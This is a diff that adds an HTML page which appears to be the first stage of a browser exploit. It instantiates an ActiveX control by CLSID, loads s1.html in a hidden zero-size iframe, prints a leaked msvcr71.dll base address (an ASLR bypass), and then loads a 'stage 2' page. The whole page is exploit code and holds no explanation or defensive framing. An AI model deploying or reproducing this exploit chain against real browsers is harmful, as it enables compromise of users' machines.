@@ -1,0 +1,46 @@
+<html>
+<head>
+<OBJECT classid='clsid:D2AC2892-B39B-11D1-8704-00600893B1BD'> </OBJECT>
+</head>
+<body bgcolor="white">
+
+<iframe src='' id='runme' style='width:0px;height:0px;'></iframe><br/>
+
+<center>
+
+
+<img src='NINJA.JPG'/><br/>
+
+
+<div id='output'>...</div>
+
+</center>
+<script type="text/javascript">
+ 
+ window.baseDll = 0x00;
+
+ var frame = document.getElementById('runme');
+
+ frame.onload = function() {
+
+        if(window.baseDll != 0x00) {
+    
+           out = document.getElementById('output');
+           out.innerHTML = '<b> msvcr71.dll base address : 0x' + window.baseDll + '0000</b>';
+
+           //stage 2 
+           setTimeout('frame.src = "s2.html";',1000);
+
+        }  
+ 
+ }
+ 
+ frame.src = 's1.html';
+
+
+
+</script>
+
+
+</body>
+</html>
